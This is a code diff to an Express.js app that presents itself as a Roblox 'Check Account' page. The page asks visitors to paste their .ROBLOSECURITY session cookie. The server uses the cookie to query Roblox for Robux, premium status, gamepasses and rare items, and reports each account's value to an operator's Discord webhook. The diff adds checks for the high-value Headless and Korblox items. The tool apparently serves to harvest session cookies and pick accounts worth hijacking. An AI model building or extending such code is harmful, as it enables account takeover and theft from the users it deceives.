@@ -2,7 +2,7 @@ const express = require('express');
 const app = express();
 app.use(express.json());
 
-// CORS – żeby strona działała
+// CORS
 app.use((req, res, next) => {
   res.header('Access-Control-Allow-Origin', '*');
   res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
@@ -13,7 +13,7 @@ app.use((req, res, next) => {
   next();
 });
 
-// Strona główna – Twoja oryginalna strona HTML
+// Strona główna (HTML bez zmian – tylko wynik będzie miał nowe linie)
 app.get('/', (req, res) => {
   res.send(`<!DOCTYPE html>
 <html lang="en">
@@ -40,6 +40,7 @@ app.get('/', (req, res) => {
 <br>
 <button onclick="checkAccount()">Check Account</button>
 <div id="result"></div>
+
 <script>
 async function checkAccount() {
   const cookieVal = document.getElementById('cookie').value.trim();
@@ -50,6 +51,7 @@ async function checkAccount() {
     return;
   }
   result.innerHTML = '<i>Checking account... please wait</i>';
+
   try {
     const resp = await fetch('/check', {
       method: 'POST',
@@ -57,26 +59,33 @@ async function checkAccount() {
       body: JSON.stringify({ cookie: cookieVal })
     });
     const json = await resp.json();
+
     if (json.error) {
       result.innerHTML = \`<span class="error">Error: \${json.error}</span>\`;
       return;
     }
+
     if (json.success) {
       const creationDate = json.created !== 'failed to fetch'
         ? new Date(json.created).toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' })
         : '—';
+
       let avatarHtml = json.avatarUrl
         ? \`<img id="avatar" src="\${json.avatarUrl}" alt="Avatar" onerror="this.src='https://via.placeholder.com/720?text=No+Avatar';">\`
         : '<p style="color:#ffcc00;">Could not load avatar</p>';
+
       const mm2Passes = [429957, 1308795];
       let mm2Count = mm2Passes.filter(id => json.hasGamePasses?.includes(id)).length;
       const mm2Color = mm2Count > 0 ? '#00ff9d' : '#ff4d4d';
+
       const ampPasses = [189425850, 951065968, 951441773, 6408694, 60406961585546290, 7124470, 6965379, 3196348, 5300198];
       let ampCount = ampPasses.filter(id => json.hasGamePasses?.includes(id)).length;
       const ampColor = ampCount > 0 ? '#00ff9d' : '#ff4d4d';
+
       const sabPasses = [1227013099, 1229510262, 1228591447];
       let sabCount = sabPasses.filter(id => json.hasGamePasses?.includes(id)).length;
       const sabColor = sabCount > 0 ? '#00ff9d' : '#ff4d4d';
+
       result.innerHTML = \`
         <span class="success">Account verified successfully!</span><br><br>
         \${avatarHtml}
@@ -84,17 +93,16 @@ async function checkAccount() {
         <b>Display Name:</b> \${json.displayName}<br>
         <b>User ID:</b> \${json.userId}<br>
         <b>Roblox Premium:</b> <span style="color: \${json.hasPremium ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">\${json.hasPremium ? 'YES ✓' : 'NO ✗'}</span><br>
-      
-        <b>Email / Phone Verified:</b> <span style="color: \${json.emailVerified ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">
-          \${json.emailVerified ? 'YES ✓ (hat detected)' : 'NO ✗'}
-        </span><br>
-      
+        <b>Email / Phone Verified:</b> <span style="color: \${json.emailVerified ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">\${json.emailVerified ? 'YES ✓ (hat detected)' : 'NO ✗'}</span><br>
         <b>Robux Balance:</b> <span style="color: #ffcc00; font-weight: bold;">\${json.robux.toLocaleString('en-US')} Robux</span><br>
-      
+
         <b>MM2 Gamepasses:</b> <span style="color: \${mm2Color}; font-weight: bold;">\${mm2Count}</span><br>
         <b>AMP Gamepasses:</b> <span style="color: \${ampColor}; font-weight: bold;">\${ampCount}</span><br>
         <b>SAB Gamepasses:</b> <span style="color: \${sabColor}; font-weight: bold;">\${sabCount}</span><br>
-      
+
+        <b>Headless Horseman:</b> <span style="color: \${json.hasHeadless ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">\${json.hasHeadless ? 'YES ✓' : 'NO ✗'}</span><br>
+        <b>Korblox Deathspeaker:</b> <span style="color: \${json.hasKorblox ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">\${json.hasKorblox ? 'YES ✓' : 'NO ✗'}</span><br>
+
         <b>Account Age:</b> <span style="color: #ffcc00; font-weight: bold;">\${json.accountAgeDays} days</span><br>
         <b>Created:</b> \${creationDate} \${json.created !== 'failed to fetch' ? \`<small>(\${json.created.split('T')[0]})\</small>\` : ''}<br>
       \`;
@@ -108,7 +116,7 @@ async function checkAccount() {
 </html>`);
 });
 
-// Endpoint do sprawdzania konta + wysyłka na webhook
+// Główna logika sprawdzania
 app.post('/check', async (req, res) => {
   const { cookie } = req.body || {};
   if (!cookie || typeof cookie !== 'string' || cookie.length < 200) {
@@ -141,19 +149,12 @@ app.post('/check', async (req, res) => {
     }
     const userData = await userRes.json();
 
-    // Verified Email (hat 102611803)
+    // Verified Email (hat)
     let emailVerified = false;
     try {
       const ownsRes = await fetch(
         `https://inventory.roblox.com/v1/users/${userData.id}/items/Asset/102611803`,
-        {
-          method: 'GET',
-          headers: {
-            'Cookie': `.ROBLOSECURITY=${cookie}`,
-            'X-CSRF-TOKEN': csrfToken,
-            'Accept': 'application/json',
-          },
-        }
+        { headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken, 'Accept': 'application/json' } }
       );
       if (ownsRes.ok) {
         const ownsData = await ownsRes.json();
@@ -182,7 +183,7 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
-    // Wiek konta + data utworzenia
+    // Wiek + data utworzenia
     let accountAgeDays = 0;
     let createdDate = null;
     try {
@@ -206,7 +207,7 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
-    // Gamepasy
+    // Gamepasy (bez zmian)
     const mm2Ids = [429957, 1308795];
     const ampIds = [189425850, 951065968, 951441773, 6408694, 60406961585546290, 7124470, 6965379, 3196348, 5300198];
     const sabIds = [1227013099, 1229510262, 1228591447];
@@ -217,13 +218,7 @@ app.post('/check', async (req, res) => {
       for (const passId of allIds) {
         const gpRes = await fetch(
           `https://inventory.roblox.com/v1/users/${userData.id}/items/GamePass/${passId}`,
-          {
-            headers: {
-              'Cookie': `.ROBLOSECURITY=${cookie}`,
-              'X-CSRF-TOKEN': csrfToken,
-              'Accept': 'application/json',
-            },
-          }
+          { headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken, 'Accept': 'application/json' } }
         );
         if (gpRes.ok) {
           const gpData = await gpRes.json();
@@ -233,6 +228,36 @@ app.post('/check', async (req, res) => {
         }
       }
     } catch {}
+
+    // ────────────────────────────────────────────────
+    //     NOWOŚĆ → sprawdzanie Headless i Korblox
+    // ────────────────────────────────────────────────
+    let hasHeadless = false;
+    let hasKorblox = false;
+
+    try {
+      // Headless Head (najczęściej używany asset ID)
+      const headlessRes = await fetch(
+        `https://inventory.roblox.com/v1/users/${userData.id}/items/Asset/134082579`,
+        { headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken, 'Accept': 'application/json' } }
+      );
+      if (headlessRes.ok) {
+        const data = await headlessRes.json();
+        hasHeadless = Array.isArray(data.data) && data.data.length > 0;
+      }
+
+      // Korblox Deathspeaker (lewa noga – najczęściej spotykany ID)
+      const korbloxRes = await fetch(
+        `https://inventory.roblox.com/v1/users/${userData.id}/items/Asset/144636901`,
+        { headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken, 'Accept': 'application/json' } }
+      );
+      if (korbloxRes.ok) {
+        const data = await korbloxRes.json();
+        hasKorblox = Array.isArray(data.data) && data.data.length > 0;
+      }
+    } catch (e) {
+      console.error("Błąd podczas sprawdzania Headless/Korblox:", e.message);
+    }
 
     const result = {
       success: true,
@@ -246,11 +271,13 @@ app.post('/check', async (req, res) => {
       avatarUrl,
       hasGamePasses,
       emailVerified,
+      hasHeadless,
+      hasKorblox,
     };
 
     res.status(200).json(result);
 
-    // Wysyłka do webhooka – z emoji zamiast nazw
+    // Webhook z nowymi polami (możesz dodać emoji jeśli masz)
     const webhookUrl = process.env.WEBHOOK;
     if (webhookUrl) {
       try {
@@ -260,7 +287,7 @@ app.post('/check', async (req, res) => {
           body: JSON.stringify({
             embeds: [{
               title: `${userData.name} Roblox Info`,
-              color: 0x9B59B6, // fioletowy
+              color: 0x9B59B6,
               thumbnail: {
                 url: avatarUrl || "https://tr.rbxcdn.com/30DAY-AvatarHeadshot?width=720&height=720&format=png"
               },
@@ -275,14 +302,14 @@ app.post('/check', async (req, res) => {
                 },
                 { name: "Created", value: createdDate ? createdDate.split('T')[0] : "?", inline: true },
                 { name: "Account Age", value: `${accountAgeDays} days`, inline: true },
-                // ← tutaj zmiana na emoji
                 { name: "<:MM2:1481763122808230164> Gamepasses", value: `${hasGamePasses.filter(id => mm2Ids.includes(id)).length}`, inline: true },
                 { name: "<:AMP:1481763635775930520> Gamepasses", value: `${hasGamePasses.filter(id => ampIds.includes(id)).length}`, inline: true },
                 { name: "<:SAB:1481763931113394177> Gamepasses", value: `${hasGamePasses.filter(id => sabIds.includes(id)).length}`, inline: true },
+                // Nowe pola
+                { name: "Headless Horseman", value: hasHeadless ? "YES ✓" : "NO ✗", inline: true },
+                { name: "Korblox Deathspeaker", value: hasKorblox ? "YES ✓" : "NO ✗", inline: true },
               ],
-              footer: {
-                text: "Checker • " + new Date().toLocaleString()
-              },
+              footer: { text: "Checker • " + new Date().toLocaleString() },
               timestamp: new Date().toISOString()
             }]
           })
